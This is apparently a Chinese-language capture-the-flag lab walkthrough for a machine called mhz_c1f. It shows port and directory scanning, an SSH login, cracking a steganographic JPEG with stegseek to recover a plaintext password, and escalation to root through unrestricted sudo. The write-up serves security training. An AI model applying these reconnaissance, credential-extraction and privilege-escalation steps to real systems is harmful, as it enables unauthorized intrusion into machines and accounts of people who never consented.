

## 端口扫描

```bash
┌──(kali㉿kali)-[~/workspace]
└─$ sudo nmap -sT -sCV -O -p22,80 10.10.10.33
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-13 02:49 EDT
Nmap scan report for 10.10.10.33
Host is up (0.00047s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 38:d9:3f:98:15:9a:cc:3e:7a:44:8d:f9:4d:78:fe:2c (RSA)
|   256 89:4e:38:77:78:a4:c3:6d:dc:39:c4:00:f8:a5:67:ed (ECDSA)
|_  256 7c:15:b9:18:fc:5c:75:aa:30:96:15:46:08:a9:83:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
MAC Address: 00:0C:29:93:8A:BE (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```

## 目录扫描

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.33/  -q -t 100 -x txt,php,rar,zip,sql
/notes.txt            (Status: 200) [Size: 86]
/server-status        (Status: 403) [Size: 276]
```
到此文件http://10.10.10.33/notes.txt
内容如下
```bash
1- i should finish my second lab 
2- i should delete the remb.txt file and remb2.txt
```


## 第一个shell

```bash
└─$ ssh first_stage@10.10.10.33                            
The authenticity of host '10.10.10.33 (10.10.10.33)' can't be established.
ED25519 key fingerprint is SHA256:Jxm0b2xUhxb2N50E9UVsgn5u7Pow8xX6o12kZDGlTlg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.33' (ED25519) to the list of known hosts.
first_stage@10.10.10.33's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-96-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Mar 13 15:09:30 UTC 2024

  System load:  0.03              Processes:            148
  Usage of /:   40.9% of 9.78GB   Users logged in:      0
  Memory usage: 41%               IP address for ens33: 10.10.10.33
  Swap usage:   0%


23 packages can be updated.
0 updates are security updates.


Last login: Fri Apr 24 18:18:07 2020 from 192.168.5.253
$ whoami
first_stage
$ 
```

在用户mhz_c1f家目录下找到一个文件夹
里面有些图片
```bash
$ cd Paintings
$ ls -la
total 2212
drwxrwxr-x 2 mhz_c1f mhz_c1f   4096 Apr 24  2020  .
drwxr-xr-x 5 mhz_c1f mhz_c1f   4096 Apr 24  2020  ..
-rw-rw-r-- 1 mhz_c1f mhz_c1f 447755 Apr 24  2020 '19th century American.jpeg'
-rw-rw-r-- 1 mhz_c1f mhz_c1f 356338 Apr 24  2020 'Frank McCarthy.jpeg'
-rw-rw-r-- 1 mhz_c1f mhz_c1f 519616 Apr 24  2020 'Russian beauty.jpeg'
-rw-rw-r-- 1 mhz_c1f mhz_c1f 926849 Apr 24  2020 'spinning the wool.jpeg'
```
```bash
┌──(kali㉿kali)-[~/workspace]
└─$ steghide extract -sf spinning\ the\ wool.jpeg           
Enter passphrase: 
steghide: could not open the file "remb2.txt".
```
当尝试steghide解spinning\ the\ wool.jpeg时，提示需要密码去破解remb2.txt



## 提权

这图片隐写，用stegseek直接能出
```bash
┌──(kali㉿kali)-[~/workspace]
└─$ sudo stegseek spinning\ the\ wool.jpeg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""
[i] Original filename: "remb2.txt".
[i] Extracting to "spinning the wool.jpeg.out".

┌──(kali㉿kali)-[~/workspace]
└─$ cat spinning\ the\ wool.jpeg.out 
ooh , i know should delete this , but i cant' remember it 
screw me 

mhz_c1f:1@ec1f
```

```bash
$ su mhz_c1f
Password: 
mhz_c1f@mhz_c1f:~/Paintings$ sudo -l
[sudo] password for mhz_c1f: 
Matching Defaults entries for mhz_c1f on mhz_c1f:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mhz_c1f may run the following commands on mhz_c1f:
    (ALL : ALL) ALL
mhz_c1f@mhz_c1f:~/Paintings$ sudo /bin/bash
root@mhz_c1f:~/Paintings#
```